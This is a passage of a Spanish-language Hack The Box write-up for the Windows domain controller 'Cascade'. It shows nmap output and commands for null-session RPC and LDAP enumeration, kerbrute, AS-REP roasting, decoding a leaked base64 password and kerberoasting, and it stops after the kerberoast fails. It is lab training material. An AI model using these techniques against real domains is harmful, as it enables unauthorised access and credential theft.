---
redirect_from:
  - /posts/CASCADE-WriteUp/

title: Cascade - WriteUp
date: 'Tue, 12 Aug 2025 00:00:00 GMT'
categories:
  - WriteUps
  - HTB
  - Windows
tags:
  - ctf
  - nmap
  - htb
  - impacket
  - smb
  - crackmapexec
  - rpc
  - ldap
  - winrm
  - windows
image: /assets/img/cabeceras/2025-08-12-CASCADE-WRITEUP.png
description: >-
  Cascade es una máquina Windows de dificultad media configurada como
  controlador de dominio. Los enlaces anónimos LDAP están habilitados y la
  enumeración proporciona la contraseña del usuario `r.thompson`, que da acceso
  a una copia de seguridad del registro `TightVNC`. La copia de seguridad se
  descifra para obtener la contraseña de `s.smith`. Este usuario tiene acceso a
  un ejecutable .NET que, tras la descompilación y el análisis del código
  fuente, revela la contraseña de la cuenta `ArkSvc`. Esta cuenta pertenece al
  grupo `Papelera de reciclaje de AD` y puede ver los objetos eliminados de
  Active Directory. Se ha descubierto que una de las cuentas de usuario
  eliminadas contiene una contraseña codificada, que puede reutilizarse para
  iniciar sesión como administrador principal del dominio.
---

{% include machine-info.html
  machine="Cascade"
  os="Windows"
  difficulty="Medium"
  platform="HTB"
%}


## Enumeración

NMAP

```bash
# Nmap 7.94SVN scan initiated Tue Nov 28 11:17:30 2023 as: nmap -sCV -p53,88,135,139,389,445,636,3268,3269,5985,49154,49155,49157,49158,49170 -oN targeted 10.129.117.116
Nmap scan report for 10.129.117.116
Host is up (0.097s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-28 10:17:33Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49170/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-11-28T10:18:23
|_  start_date: 2023-11-28T10:13:58
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
|_clock-skew: -4s
```

Vamos a intentar enumerar usuarios válidos conectándonos con _rpcclient_ mediante una null session:

```bash
$ rpcclient -U "" 10.129.117.116
```

![CASCADE](/assets/img/htb-writeups/Pasted-image-20231128114053.png)

Y podemos enumerarlos. Vamos a copiarnos los usuarios en un archivo de texto para usarlo más adelante limpiando todo lo que nos sobra:

```bash
$ rpcclient -U "" -N 10.129.117.116 -c "enumdomusers" | grep -oP '\[.*?\]' | grep -v 0x | tr -d '[]' > users.txt
```

Ya tenemos guardados los usuarios en el archivo "users.txt"

Ahora vamos a validar con _kerbrute_ si los usuarios que tenemos son válidos y nos quedaremos solo con ellos:

```bash
$ kerbrute userenum --dc 10.129.117.116 -d cascade.local users.txt
```

![CASCADE](/assets/img/htb-writeups/Pasted-image-20231128115356.png)

Teniendo esto, vamos a intentar conseguir un TGT a través de una ASEPRoast Attack con _impacket-GetNPUsers_

```bash
impacket-GetNPUsers -no-pass -usersfile users.txt cascade.local/
```

![CASCADE](/assets/img/htb-writeups/Pasted-image-20231128120847.png)

Pero no tenemos suerte, de todas formas _kerbrute_ ya nos dejó claro que no lo eran ya que ninguno arrojó el hash en la enumeración.

## Explotación

Vamos a intentar enumerar por SMB con una null session ya que seguimos sin credenciales válidas.

```bash
smbclient -L 10.129.117.116 -N
```

![CASCADE](/assets/img/htb-writeups/Pasted-image-20231128121852.png)

Pero tampoco hay suerte. Vamos aprobar por LDAP con _ldapsearch_

```bash
$ ldapsearch -x -H ldap://10.129.117.116 -b "DC=cascade,DC=local"
...
$ ldapsearch -x -H ldap://10.129.117.116 -b "DC=cascade,DC=local" | grep -i userprincipalname
```

![CASCADE](/assets/img/htb-writeups/Pasted-image-20231128142038.png)

Vamos a ampliar la información de cada línea encontrada para ver si podemos ver más detalles de la cuenta.

```bash
$ ldapsearch -x -H ldap://10.129.117.116 -b "DC=cascade,DC=local" | cat -l rb
```

Hacemos una búsqueda con la cadena _UserPrincipalName_ y vamos saltando. En el segundo salto vemos que el usuario _s.smith_ pertenece al grupo _Remote Management_:

![CASCADE](/assets/img/htb-writeups/Pasted-image-20231128144333.png)

Encontramos un usuario que si tuviéramos sus credenciales podríamos conectarnos con _EvilWinRM_.

Seguimos y encontramos esto:

![CASCADE](/assets/img/htb-writeups/Pasted-image-20231128144503.png)

Encontramos un password en formato _base64_ en el usuario _r.thompson_

```bash
$ echo -n "clk0bjVldmE=" | base64 -d ;echo
rY4n5eva
```

Probamos las credenciales para ver si son válidas:

```bash
$ crackmapexec smb 10.129.117.116 -u 'r.thompson' -p 'rY4n5eva'
```

![CASCADE](/assets/img/htb-writeups/Pasted-image-20231128144821.png)

Pues tenemos nuestras primeras credenciales y recursos compartidos...

Ahora que tenemos un usuario válido vamos a intentar volcar la información del dominio:

```bash
$ sudo ldapdomaindump -u 'CASCADE.LOCAL\r.thompson' -p 'rY4n5eva' 10.129.117.116
```

![CASCADE](/assets/img/htb-writeups/Pasted-image-20231128150412.png)

Ahora ya podemos tener de una manera más visual la información del dominio. Levantamos un servidor http con Python y accedemos a la URL http://127.0.0.1/domain_users.html

![CASCADE](/assets/img/htb-writeups/Pasted-image-20231128150603.png)

Ahora podemos explorar la información de una manera más cómoda.

Vamos a probar un "kerberoasting attack" con _impacket-GetUserSPNs_:

```bash
$ impacket-GetUserSPNs -request 'cascade.local/r.thompson:rY4n5eva'

Impacket v0.11.0 - Copyright 2023 Fortra

No entries found!
```



Pues por ahora no podemos :)

---

**Última actualización**: 2025-08-12<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
